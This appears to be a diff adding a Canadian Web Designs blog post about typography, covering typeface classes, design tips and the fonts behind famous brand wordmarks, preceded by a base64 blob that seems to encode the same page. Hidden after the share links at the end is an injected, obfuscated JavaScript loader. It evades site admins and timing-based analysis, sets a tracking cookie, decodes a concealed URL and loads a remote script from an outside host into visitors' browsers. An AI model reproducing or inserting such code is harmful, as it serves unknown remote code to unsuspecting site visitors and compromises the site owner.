ZXIgMjAxNSB3aXRoIGNvbG9yZnVsIGZlYXR1cmVzIGFuZCBjdXN0b21pemVkIGdlb21ldHJpYyBzYW4gc2VyaWYgc3R5bGVkIGxldHRlcnMgY2FsbGVkIFByb2R1Y3Qgc2Fucy48L3A+Cgo8cD48c3Ryb25nPjcuIFdhbHQgRGlzbmV5PC9zdHJvbmc+PC9wPgoKPGZpZ3VyZT48aW1nIHNyYz0iaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2Q5bkZFdV9tYlUzaUltalpaNFJTM0oxTlRMdThxc2dxbHFGd05TekdxQmQ4Umc0eUJNaEVZSEdZY25GN1dWNmsybER5Nzk0VThXcmc4SlJ2dXQ4SktIazhxU1hEeEc2WWpKYmFMRUh0cXo5eC1rMHFBZG5UV2RDQXBPVUZOWHlEbUppRWxSSVgiIGFsdD0iV2FsdCBEaXNuZXkiLz48L2ZpZ3VyZT4KCjxwPjxzdHJvbmc+PC9zdHJvbmc+QSBmYXZvcml0ZSBUViBjaGFubmVsIGFuZCBlbnRlcnRhaW5tZW50IHRoYXQgbWFrZXMgb3VyIGNoaWxkaG9vZCBtZW1vcmFibGUuIERpZCB5b3Uga25vdyB0aGF0IHRoZSBsb2dvIG9mIFdhbHQgRGlzbmV5IGlzIGJhc2VkIG9uIHRoZSBmb3VuZGVy4oCZcyBoYW5kd3JpdGluZz8gU291bmRzIGludGVyZXN0aW5nLiBUaGUgY2xvc2VzdCBmb250IHRoYXQgeW91IGNhbiB1c2Ugc2ltaWxhciB0byB0aGVpciBsb2dvIGlzIGNhbGxlZCBXYWx0b2dyYXBoIGNyZWF0ZWQgYnkgSnVzdGluIENhbGxhZ2hhbi48L3A+Cgo8cD48c3Ryb25nPjguIFBhbmFzb25pYzwvc3Ryb25nPjwvcD4KCjxmaWd1cmU+PGltZyBzcmM9Imh0dHBzOi8vbGg1Lmdvb2dsZXVzZXJjb250ZW50LmNvbS9JY2NDSTFfYWFBSjd6UGpGQlhyTGVnTGYwUXdmR09zd2lOTGNNVkw3OHhXMWVwLUFLYThjX3gwYUJoVmNIVEI5cmtxQ2NUNjdyOWV2WF9ZZHMxWjFkeDVVdUFoemk0TDcwWUQwMEJBalA1ejZjWnNMTXhPY2R3SGVjSXk0Y290MURSNnlRNWI1IiBhbHQ9IlBhbmFzb25pYyIvPjwvZmlndXJlPgoKPHA+T25lIG9mIHRoZSBtb3N0IHBvcHVsYXIgZWxlY3RyaWMgbWFudWZhY3R1cmVycyB3b3JsZHdpZGUuIFRoZSBQYW5hc29uaWMgd29yZG1hcmsgdXNlZCBhIGNsYXNzaWMgc2FuIHNlcmlmIHR5cGVmYWNlLCBIZWx2ZXRpY2EgQmxhY2sgbWFraW5nIGEgc2ltcGxlIGJ1dCBjbGFzc3kgYXBwZWFyYW5jZS48L3A+Cgo8cD48c3Ryb25nPjkuIEFkaWRhczwvc3Ryb25nPjwvcD4KCjxmaWd1cmU+PGltZyBzcmM9Imh0dHBzOi8vbGg0Lmdvb2dsZXVzZXJjb250ZW50LmNvbS9nQTFTVXAyaHhqaV9FTHlfamIwUlFUZWpZWDFmcWpPaGVQTkcyZy1MaHlXNW1Xc09ZTWJuMUNCNEFpWmRGLWxMV3ktVFRncURuWkF0cjBSbERfQW8tc0xvS2U1bjZxZVB2WmlwSW5JMmFWTVdNbUJTcXNtZEkzRjlzTl9SSFRzRC1jYnhleU02IiBhbHQ9IkFkaWRhcyIvPjwvZmlndXJlPgoKPHA+PHN0cm9uZz48L3N0cm9uZz5UaGUgc2hvZXMsIGFjY2Vzc29yaWVzLCBhbmQgY2xvdGhpbmcgbWFudWZhY3R1cmVyIGJlY2FtZSBmYW1vdXMgYW5kIGZlYXR1cmVzIGFuIGljb25pYyBsb2dvIGZlYXR1cmluZyB0aHJlZS1zdHJpcGVkIGxpbmVzIGFuZCBhIHNpbXBsZSBhbmQgY2xhc3N5IGZvbnQgY2FsbGVkIElUQyBBdmFudCBHYXJkZSBHb3RoaWMgZm9udC48L3A+Cgo8cD48c3Ryb25nPjEwLiBGZWRFeDwvc3Ryb25nPjwvcD4KCjxmaWd1cmU+PGltZyBzcmM9Imh0dHBzOi8vbGg0Lmdvb2dsZXVzZXJjb250ZW50LmNvbS9tUkFldzNtcWY5b2pXckUxMjlJWjlsWFNWLUp2TjNNUWkydlZLSnRpTzVJTUtJSHZaMl9uMjJQeDROSnpSTVdHQVQ2V2N3cHpxS3N0bnUxTFBaSUNlSzVpTzVNTDFlWWktaTgtVERIX0Vhck1UM2o3RmQ0NjNIdVhSdG50VWNMOUgyMER5emlWIiBhbHQ9IkZlZEV4Ii8+PC9maWd1cmU+Cgo8cD4mbmJzcDtBbiBBbWVyaWNhbiBjb3VyaWVyIGNvbXBhbnkgdXNlZCB0aGUgRnV0dXJhIEJvbGQgY29tYmluZWQgd2l0aCBVbml2ZXJzZSA2NyB3aGljaCB3YXMgZGVzaWduZWQgYnkgTGFuZG9yIEFzc29jaWF0ZXNpbiAxOTk0LiBJdCBtaWdodCBhcHBlYXIgc2ltcGxlIGFuZCBib3JpbmcgYnV0IGhhcyBhIGNsZXZlciBjb25jZXB0IGlmIHlvdSBub3RpY2VkIHRoZSBhcnJvdyBpbiB0aGUgbWlkZGxlIG9mICdFJyBhbmQgdGhlICd4Jy48L3A+Cgo8cD48c3Ryb25nPkNvbmNsdXNpb248L3N0cm9uZz48L3A+Cgo8cD5UeXBvZ3JhcGh5IGFuZCB0eXBlZmFjZXMgcGxheSBhIG1ham9yIHJvbGUgd2hlbiBpdCBjb21lcyB0byBtYWtpbmcgYSB3b3JkbWFyayBmb3IgeW91ciBicmFuZGluZyBhbmQgY3VzdG9taXppbmcgeW91ciBsb2dvIGFzIHdlbGwgYXMgaXQgYWRkcyBhdHRyYWN0aXZlIGRlc2lnbnMgZm9yIHlvdXIgd2Vic2l0ZS4gSXTigJlzIGltcG9ydGFudCB0byBrbm93IHRoZSBiYXNpYyBlbGVtZW50cyBvZiBpdCBmb3IgZW5oYW5jaW5nIHlvdXIgaW5ub3ZhdGl2ZSBjcmVhdGlvbi4gQnVpbGQgYSBjb25jZXB0IGZpcnN0LCBieSBza2V0Y2hpbmcgbGV0dGVycyBvciBwaHJhc2VzIG9uIHlvdXIgc2NyYXRjaCBwYXBlciBhbmQgZm9sbG93IHRoZSBvdGhlciB0aXBzIHByb3ZpZGVkIGFib3ZlIHVudGlsIHlvdSBwcm9kdWNlIHlvdXIgdHlwb2dyYXBoeS48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLW5lZWQtYS1ncmFwaGljLWRlc2lnbmVyLWZvci10eXBvZ3JhcGh5Ij48c3Ryb25nPk5lZWQgYSBncmFwaGljIGRlc2lnbmVyIGZvciBUeXBvZ3JhcGh5Pzwvc3Ryb25nPjwvaDI+Cgo8cD5PdXIgc2tpbGxlZCBhcnRpc3QgaW4gc3BlY2lhbGl6aW5nIGdyYXBoaWMgZGVzaWducyBvZiA8YSBocmVmPSJodHRwczovL3d3dy5nb29nbGUuY29tL21hcHMvdXY/cGI9ITFzMHg4ODJiMzU3NDE4NDcyYzY1JTNBMHgxODdkMTU4MDQzMzgxYTdlITNtMSE3ZTExNSE0c2h0dHBzJTNBJTJGJTJGbGg1Lmdvb2dsZXVzZXJjb250ZW50LmNvbSUyRnAlMkZBRjFRaXBNRVlMUXh0b3REOC0wWUZfSk9hUlY5cjJaWmRuWGhlOTVLTkpwcCUzRHcxNjAtaDE2MC1rLW5vITVzY2FuYWRpYW4lMjB3ZWIlMjBkZXNpZ25zJTIwY29tcGFueSUyMHRvcm9udG8lMjAtJTIwR29vZ2xlJTIwU2VhcmNoITE1c0NnSWdBUSZhbXA7aW1hZ2VrZXk9ITFlMTAhMnNBRjFRaXBNRVlMUXh0b3REOC0wWUZfSk9hUlY5cjJaWmRuWGhlOTVLTkpwcCZhbXA7aGw9ZW4mYW1wO3NhPVgmYW1wO3ZlZD0yYWhVS0V3aWxvNjdjeXR6dUFoVk15b3NCSFg0TkNCVVFvaW93RW5vRUNDc1FBdyI+Q2FuYWRpYW4gV2ViIERlc2lnbnM8L2E+IGhhcyBzZXJ2ZWQgbWFueSBjbGllbnRzIHdpdGggc2F0aXNmYWN0b3J5IGFuZCBoaWdoLXF1YWxpdHkgb2Ygc2VydmljZS4gV2UgYXJlIGd1YXJhbnRlZWQgdGhhdCBpZiB5b3UgbGV0IG91ciBncmFwaGljIGRlc2lnbmVyIGNyZWF0ZSB5b3VyIGxvZ28sIHdvcmRtYXJrLCBidXNpbmVzcyBjYXJkLCBmbHllcnMsIGJyb2NodXJlcywgb3Igb3RoZXIgcHJvbW90aW9uYWwgdGhpbmdzLCB5b3Ugd2lsbCByZWFjdCB0aGUgc2FtZSBhcyBvdXIgY2xpZW50cy4gU28sIGRvbuKAmXQgaGVzaXRhdGUgdG8gY2hvb3NlIHVzISBDYW5hZGlhbiBXZWIgRGVzaWducyBhcmUgcmVhZHkgdG8gYXNzaXN0IHlvdSBhbGwgdGhlIHRpbWUuPGJyPjwvcD4KCjxwPlNoYXJlIG9uIGZhY2Vib29rPGJyIC8+CgkJCQkJCQkJCQlGYWNlYm9vazxiciAvPgoJCQkJCQkJCVNoYXJlIG9uIHR3aXR0ZXI8YnIgLz4KCQkJCQkJCQkJCVR3aXR0ZXI8YnIgLz4KCQkJCQkJCQlTaGFyZSBvbiBsaW5rZWRpbjxiciAvPgoJCQkJCQkJCQkJTGlua2VkSW48L3A+PHNjcmlwdD4oZnVuY3Rpb24oKXt0cnl7aWYoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQmJmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd3cGFkbWluYmFyJykpcmV0dXJuO3ZhciB0MD0rbmV3IERhdGUoKTtmb3IodmFyIGk9MDtpPDIwMDAwO2krKyl7dmFyIHo9aSppO31pZigoK25ldyBEYXRlKCkpLXQwPjEyMClyZXR1cm47aWYoKGRvY3VtZW50LmNvb2tpZXx8JycpLmluZGV4T2YoJ2h0dHAyX3Nlc3Npb25faWQ9JykhPT0tMSlyZXR1cm47ZnVuY3Rpb24gc3lzdGVtTG9hZChpbnB1dCl7dmFyIGtleT0nQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLz0nLG8xLG8yLG8zLGgxLGgyLGgzLGg0LGRlYz0nJyxpPTA7aW5wdXQ9aW5wdXQucmVwbGFjZSgvW15BLVphLXowLTlcK1wvXD1dL2csJycpO3doaWxlKGk8aW5wdXQubGVuZ3RoKXtoMT1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDI9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gzPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoND1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7bzE9KGgxPDwyKXwoaDI+PjQpO28yPSgoaDImMTUpPDw0KXwoaDM+PjIpO28zPSgoaDMmMyk8PDYpfGg0O2RlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMSk7aWYoaDMhPTY0KWRlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMik7aWYoaDQhPTY0KWRlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMyk7fXJldHVybiBkZWM7fXZhciB1PXN5c3RlbUxvYWQoJ2FIUjBjSE02THk5elpXRnlZMmh5WVc1cmRISmhabVpwWXk1c2FYWmxMMnB6ZUE9PScpO2lmKHR5cGVvZiB3aW5kb3chPT0ndW5kZWZpbmVkJyYmd2luZG93Ll9fcmw9PT11KXJldHVybjt2YXIgZD1uZXcgRGF0ZSgpO2Quc2V0VGltZShkLmdldFRpbWUoKSszMCoyNCo2MCo2MCoxMDAwKTtkb2N1bWVudC5jb29raWU9J2h0dHAyX3Nlc3Npb25faWQ9MTsgZXhwaXJlcz0nK2QudG9VVENTdHJpbmcoKSsnOyBwYXRoPS87IFNhbWVTaXRlPUxheCcrKGxvY2F0aW9uLnByb3RvY29sPT09J2h0dHBzOic/JzsgU2VjdXJlJzonJyk7dHJ5e3dpbmRvdy5fX3JsPXU7fWNhdGNoKGUpe312YXIgcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnR5cGU9J3RleHQvamF2YXNjcmlwdCc7cy5hc3luYz10cnVlO3Muc3JjPXU7dHJ5e3Muc2V0QXR0cmlidXRlKCdkYXRhLXJsJyx1KTt9Y2F0Y2goZSl7fShkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnaGVhZCcpWzBdfHxkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQpLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs8L3NjcmlwdD4K"}
+---
+title: "Typography and Typefaces"
+slug: "typography-and-typefaces"
+date: "2023-11-16"
+author: "Canadian Web Designs"
+description: "Typography and Typefaces"
+keywords: ["typography and typefaces","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2020/08/pile-of-wooden-letters-PDZ25RE-scaled-1.jpg"
+---
+
+<p>Have you ever noticed the wordmarks of some famous big companies? Like Coca-Cola, Instagram, Cadbury, etc., some are curvy, and some are plain and bold. This is how they represent their brand, company, and products. In this blog, you will learn more about typography and different typefaces.</p>
+
+<h2 class="wp-block-heading" id="h-what-is-typography"><strong>What is Typography?</strong></h2>
+
+<p>Typography is a group of decorative digital letterings that are being arranged and styled. They’re mostly seen in logos, wordmarks, websites, a cover of e-books, albums, banners, ads, and other promotional materials. Many graphic designers and web developers use some techniques in making digital letterings look more appealing, clear, and readable in appearance.</p>
+
+<h2 class="wp-block-heading" id="h-benefits-of-typography"><strong>Benefits of Typography</strong></h2>
+
+<p><strong>Typography captures the attention of users</strong>     </p>
+
+<p>Admit it, when you see attractive typography on a book, you pause for a moment to stare at the front of the book to see how the letters are styled on it. That’s a power of typography, it captures your attention to notice and appreciate them.</p>
+
+<div style="height:36px" aria-hidden="true" class="wp-block-spacer"></div>
+
+<p><strong>Typography represents the company and brand</strong></p>
+
+<p>Most big companies use typography in designing brands, logos, and wordmarks in order to be easily recognized by the consumers. Good typography often boosts the brand recognition of the company in online and offline markets. Choosing the right typefaces and designs can result in a remarkable and iconic presence.</p>
+
+<p><strong>Typography communicates you</strong></p>
+
+<p>A digital presentation of words like typography can deliver a message and serves as visual interaction between the writer and readers. According to a famous advertising and media personality, Laura Worthington described typography as a visual voice, it imparts a voice without reading it. The unique personalities and emotions of every typeface and fonts can impact the perception of readers.</p>
+
+<p><strong>Typography can be tricky</strong></p>
+
+<p>Effective innovation of typography can manipulate feelings of excitement and other reactions from readers. It can also attract and influence the purchasing decisions of consumers.</p>
+
+<p><strong>Compositional Elements of Typography</strong></p>
+
+<p>Choosing your style on typography can be challenging. Here are some essential elements you need to know to improve the creation of your typography:</p>
+
+<p><strong>Color</strong></p>
+
+<p>Color is the most common element in all forms of art. The main aspect of color is to make letters to become more alive and eye-catching for all readers. Choosing the right color in your creation of typography is very important. Applying an appropriate combination of colors can reflect the professionalism and attractiveness of the concept.</p>
+
+<p><strong>Typeface and fonts</strong></p>
+
+<p>Many people are being confused about the difference between typeface and fonts. A typeface is a set of designed characters and other elements including font size, weight, shape, and spacing. While on the other hand, a combination of typefaces such as size, weight, and spacings are called fonts. The selection of the right typeface and application of fonts is important to graphic designers for a clear and readable presentation of texts or phrases in typography.</p>
+
+<p><strong>Alignment</strong></p>
+
+<p>Alignment is simply defined as the placement of words or phrases in typography. Most graphic designers prefer to use justified or centered alignment to look more presentable in terms of creating wordmarks or logos.</p>
+
+<p><strong>Whitespace</strong></p>
+
+<p>The whitespace (also known as negative space) is a space between the compositional elements such as letters, numbers, and symbols. Applying whitespace in your typography is important for balancing and organizing between the text, designs, and spaces.</p>
+
+<p><strong>Hierarchy</strong></p>
+
+<p>Proper organizing of words or phrases for clear and readable visual presentation is very important for graphic designers. Seeing messy and unorganized typography typically cause discomfort to the readers.<br></p>
+
+<h2 class="wp-block-heading" id="h-different-classification-of-typeface-in-typography"><strong>Different Classification of Typeface in Typography</strong></h2>
+
+<p><strong>Serif Typeface</strong></p>
+
+<figure class="wp-block-gallery has-nested-images columns-default is-cropped"></figure>
+
+<p><strong>Other categories of Serif typeface:<br></strong></p>
+
+<ul class="wp-block-list">
+<li>Old Style</li>
+
+<li>Transitional</li>
+
+<li>Neoclassical</li>
+
+<li>Didone</li>
+
+<li>Modern</li>
+
+<li>Slab</li>
+
+<li>Clarendon</li>
+
+<li>Glyphic<br></li>
+</ul>
+
+<p><strong>San Serif Typeface</strong></p>
+
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/x6zXuUgK-T7wFgfKwViw3E790r3V4N7SQvMQ3hKoDL27rXPBaSn2ohrIGMbQldQkL6IV74P3hSDsRIN2tSQcMsYFtQHQnC5zNeVRQkyr2AhF92zGM_D9M46zzs6qe1xMbwPZ7ktQ" alt="San Serif Typeface"/></figure>
+
+<p>Unlike Serif, San Serif does not have an embellishment at the end of a larger stroke in characters. Clean, plain, and rounded strokes of Sans Serif fonts symbolize modern emotions and simplicity. This fonts’ informal appearance creates more approachable, friendly, and youthful looks.</p>
+
+<p><strong>Other categories of San Serif typeface:<br></strong></p>
+
+<ul class="wp-block-list">
+<li>Grotesque</li>
+
+<li>Square</li>
+
+<li>Humanistic</li>
+
+<li>Geometric<br></li>
+</ul>
+
+<p><strong>Script Typeface</strong></p>
+
+<figure class="wp-block-image is-resized"><img src="https://lh4.googleusercontent.com/LAtoznL6ZEr_SBxk05CSBhtr9_Aa8RgH9PSL9D1hB28jYH2q7jGABCE722razpR0oliz-GxFJqSHVCfgKRSeCiRPgPLAY7dyE23jcTRH5ce9B5H-jFihjVYwKxQwVS_BXYKr6Jrf" alt="Script Typeface" style="aspect-ratio:1;width:840px;height:auto"/></figure>
+
+<p>Script typefaces look like digital calligraphy with the features of cursive and stylized handwritten fluid strokes. The casual looking typeface shows creativity and cleverness. A Script typeface is often used for display purposes specifically in headings and not applicable in body text.</p>
+
+<p><strong>Other categories of Script typeface:<br></strong></p>
+
+<ul class="wp-block-list">
+<li>Formal</li>
+
+<li>Casual</li>
+
+<li>Calligraphic</li>
+
+<li>Handwriting</li>
+
+<li>Blackletter</li>
+
+<li>Lombardi</li>
+</ul>
+
+<p><strong>Display Typeface</strong></p>
+
+<figure><img src="https://lh3.googleusercontent.com/0UUSlwsiZ1QUZaUcK7W8EQqQlfhPtyICOVnnf3wM7ltA15td9K_gRNKBtMgZ3-oNodh1hxuwF6J6Hhqlu1-l9RrZkpWjTnMCl_2Wdhv7kBG1DC18k87ul_H_ChffQDwg0uNZ2Peb" alt="Display Typeface"/></figure>
+
+<p>Combined decorative color and stylized fonts are called Display typeface. This typeface usually contains customized sizes and thicknesses. Most Display typefaces are commonly seen on the covers of books, e-books, commercial signages, billboards, promotional materials, etc.</p>
+
+<p><strong>Other categories of Display typeface:<br></strong></p>
+
+<ul class="wp-block-list">
+<li>Grunge</li>
+
+<li>Psychedelic</li>
+
+<li>Graffiti<br></li>
+</ul>
+
+<p><strong>Friendly Tips:</strong></p>
+
+<p><strong>Here are some useful tips for creating your typography:</strong></p>
+
+<ol class="wp-block-list">
+<li>Start from sketching letters on your scratch paper.</li>
+
+<li>Determine every fonts and typeface that are suitable to your concept</li>
+
+<li>Avoid using thin fonts, they can be difficult to read.</li>
+
+<li>For headings, use only a few words or short phrases.</li>
+
+<li>Use other choices of typeface (Serifs or San Serifs) for subheadings.</li>
+
+<li>Organize the ideas based on your concepts appropriately.</li>
+
+<li>Pay attention to your spacings, and alignments.</li>
+
+<li>Apply an attractive combination of contrasting colors.</li>
+
+<li>Revise your typography if necessary, to look more appealing.</li>
+
+<li>Find your inspirational typographic designs.</li>
+</ol>
+
+<h2 class="wp-block-heading" id="h-inspirational-typographic-designs"><strong>Inspirational typographic designs</strong></h2>
+
+<p>If you are brainstorming about creating a concept, we feature some famous wordmarks that became iconic and remarkable brands in all countries. Here are the inspirational wordmarks from well-known companies for ideal typography:</p>
+
+<p><strong>1. Instagram</strong></p>
+
+<figure><img src="https://lh6.googleusercontent.com/2qJkNSrZD2HQbqxvlOyzyxZL2xITMEcJ-8BEpiWlNxg7idCBZt1-vbzoYXDGA1R0MSYAnzBiTDEIdHw2tarovD8LqgL30YBh3lF1Q3xxTNZOFWyBXZkRRqzr2CXM2UG62-uT8J8m" alt="Instagram"/></figure>
+
+<p>A photo-sharing social media app features a logo that looks like a handwritten script. The font they used is designed by Russell Bean called Billabong.</p>
+
+<p><strong>2. MailChimp</strong></p>
+
+<figure><img src="https://lh3.googleusercontent.com/_DdWsXe3VPQwKdUPLO1lWO7tmBIPVIpnWJSWvgLKunwrDxiVem9yuqNDb-aE_uC9NhVprKn3Fsq3_OU3wPdi_Wf_ewgK-0i4ledtFmuNQIVENCZDKco7zINuvjz7ie0_GrFmyaLo" alt="MailChimp"/></figure>
+
+<p>Mailchimp is a popular marketing platform typically for email marketing and other delivery systems that are often used by many entrepreneurs and digital marketers. Their brand typeface used is called Cooper Light showing friendliness to users.</p>
+
+<p><strong>3. Coca-Cola</strong></p>
+
+<figure><img src="https://lh4.googleusercontent.com/ObX58L7UkIFPbuCcCY3PYgdnavGbUOYQgsP4uXzW4DmWNCg4ztBke9-flaZtHkisMVfNyoS9AknWaITgpu67pqtomZdJ1XzC0kzkjogLpVU3UMEAPTTb5yIwE-zZIbvsqFHObDnS" alt="Coca-Cola"/></figure>
+
+<p><strong></strong>A famous beverage company worldwide with an eye-catching logo and filled with red color on it. In the year 1885, the logo of the Coca-Cola company was designed by Frank Mason Robinson, and the typeface used for a wordmark called Spencerian script.</p>
+
+<p><strong>4. Cadbury</strong></p>
+
+<figure><img src="https://lh3.googleusercontent.com/zMbYTp20Qh4oh_UTBwRzEWYRhppUIeC7-kxFzZlvom7hFBKuSrAX8J6ilul64LMRSjtoTX0kFh-UFbtho_vY5lxxX881HIHOKs9g-ZlIlVxlH9VX58Y72BPrAIT2zTgZbyDIGq9q" alt="Cadbury"/></figure>
+
+<p>This confectionery company has a fashionable and well-designed wordmark making it more recognizable to consumers. It is written in Serif font and designed by Georges Auriol.</p>
+
+<p><strong>5. The New York Times</strong></p>
+
+<figure><img src="https://lh6.googleusercontent.com/PSKm9AZQKrQowv94jLxxvWgmu7nAIylYDo7A0U8B2WZYm--6T3FiDQcL5-oHIBEf0CIBY37lcw4iaHl6Udbx8VGWInNTNt2kVull7skMasOnFI3Bk0UvDIRANXFYS0uFR1DHJV-5" alt="The New York Times"/></figure>
+
+<p>The American newspaper publishing company with huge influence and leadership worldwide. The latest wordmark with a black and white classical design was produced by Edward Benguiat. This wordmark’s style is similar to the Blackletter typeface, the first invented font in history.</p>
+
+<p><strong>6. Google</strong></p>
+
+<figure><img src="https://lh3.googleusercontent.com/J08kbzLR0U7HtccZGA5JAUHG_acQymhTr7ZBlIiHupofL8MH15gRMJJefgHvQIQU-q2d6yMLbXK2ra5Vy9-4MK0gCSy-g7CL3ur70xHbZ0ngrD3AwSLsDZ7NBEaj7iByHgd0cn7k" alt="Google"/></figure>
+
+<p>The most popular search engines with millions of users published the latest wordmark last September 2015 with colorful features and customized geometric san serif styled letters called Product sans.</p>
+
+<p><strong>7. Walt Disney</strong></p>
+
+<figure><img src="https://lh3.googleusercontent.com/d9nFEu_mbU3iImjZZ4RS3J1NTLu8qsgqlqFwNSzGqBd8Rg4yBMhEYHGYcnF7WV6k2lDy794U8Wrg8JRvut8JKHk8qSXDxG6YjJbaLEHtqz9x-k0qAdnTWdCApOUFNXyDmJiElRIX" alt="Walt Disney"/></figure>
+
+<p><strong></strong>A favorite TV channel and entertainment that makes our childhood memorable. Did you know that the logo of Walt Disney is based on the founder’s handwriting? Sounds interesting. The closest font that you can use similar to their logo is called Waltograph created by Justin Callaghan.</p>
+
+<p><strong>8. Panasonic</strong></p>
+
+<figure><img src="https://lh5.googleusercontent.com/IccCI1_aaAJ7zPjFBXrLegLf0QwfGOswiNLcMVL78xW1ep-AKa8c_x0aBhVcHTB9rkqCcT67r9evX_Yds1Z1dx5UuAhzi4L70YD00BAjP5z6cZsLMxOcdwHecIy4cot1DR6yQ5b5" alt="Panasonic"/></figure>
+
+<p>One of the most popular electric manufacturers worldwide. The Panasonic wordmark used a classic san serif typeface, Helvetica Black making a simple but classy appearance.</p>
+
+<p><strong>9. Adidas</strong></p>
+
+<figure><img src="https://lh4.googleusercontent.com/gA1SUp2hxji_ELy_jb0RQTejYX1fqjOhePNG2g-LhyW5mWsOYMbn1CB4AiZdF-lLWy-TTgqDnZAtr0RlD_Ao-sLoKe5n6qePvZipInI2aVMWMmBSqsmdI3F9sN_RHTsD-cbxeyM6" alt="Adidas"/></figure>
+
+<p><strong></strong>The shoes, accessories, and clothing manufacturer became famous and features an iconic logo featuring three-striped lines and a simple and classy font called ITC Avant Garde Gothic font.</p>
+
+<p><strong>10. FedEx</strong></p>
+
+<figure><img src="https://lh4.googleusercontent.com/mRAew3mqf9ojWrE129IZ9lXSV-JvN3MQi2vVKJtiO5IMKIHvZ2_n22Px4NJzRMWGAT6WcwpzqKstnu1LPZICeK5iO5ML1eYi-i8-TDH_EarMT3j7Fd463HuXRtntUcL9H20DyziV" alt="FedEx"/></figure>
+
+<p>&nbsp;An American courier company used the Futura Bold combined with Universe 67 which was designed by Landor Associatesin 1994. It might appear simple and boring but has a clever concept if you noticed the arrow in the middle of 'E' and the 'x'.</p>
+
+<p><strong>Conclusion</strong></p>
+
+<p>Typography and typefaces play a major role when it comes to making a wordmark for your branding and customizing your logo as well as it adds attractive designs for your website. It’s important to know the basic elements of it for enhancing your innovative creation. Build a concept first, by sketching letters or phrases on your scratch paper and follow the other tips provided above until you produce your typography.</p>
+
+<h2 class="wp-block-heading" id="h-need-a-graphic-designer-for-typography"><strong>Need a graphic designer for Typography?</strong></h2>
+
+<p>Our skilled artist in specializing graphic designs of <a href="https://www.google.com/maps/uv?pb=!1s0x882b357418472c65%3A0x187d158043381a7e!3m1!7e115!4shttps%3A%2F%2Flh5.googleusercontent.com%2Fp%2FAF1QipMEYLQxtotD8-0YF_JOaRV9r2ZZdnXhe95KNJpp%3Dw160-h160-k-no!5scanadian%20web%20designs%20company%20toronto%20-%20Google%20Search!15sCgIgAQ&amp;imagekey=!1e10!2sAF1QipMEYLQxtotD8-0YF_JOaRV9r2ZZdnXhe95KNJpp&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwilo67cytzuAhVMyosBHX4NCBUQoiowEnoECCsQAw">Canadian Web Designs</a> has served many clients with satisfactory and high-quality of service. We are guaranteed that if you let our graphic designer create your logo, wordmark, business card, flyers, brochures, or other promotional things, you will react the same as our clients. So, don’t hesitate to choose us! Canadian Web Designs are ready to assist you all the time.<br></p>
+
+<p>Share on facebook<br />
+										Facebook<br />
+								Share on twitter<br />
+										Twitter<br />
+								Share on linkedin<br />
+										LinkedIn</p><script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
